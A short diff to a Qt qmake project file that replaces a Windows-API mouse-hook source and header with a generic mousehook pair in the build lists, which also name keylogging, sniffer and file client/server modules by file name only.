@@ -27,19 +27,19 @@ SOURCES += \
         ../includes/config.cpp \
         ../includes/fileclient.cpp \
         ../includes/fileserver.cpp \
-        ../includes/mousehookWinApi.cpp \
         ../includes/klog.cpp \
-        ../includes/sniffer.cpp
+        ../includes/sniffer.cpp \
+        ../includes/mousehook.cpp
 
 HEADERS += \
         client.h \
         ../includes/config.h \
         ../includes/fileclient.h \
         ../includes/fileserver.h \
-        ../includes/mousehookWinApi.h \
         ../includes/klog.h \
         ../includes/enums.h \
-        ../includes/sniffer.h
+        ../includes/sniffer.h \
+    ../includes/mousehook.h
 
 # The following define makes your compiler emit warnings if you use
 # any feature of Qt which as been marked deprecated (the exact warnings
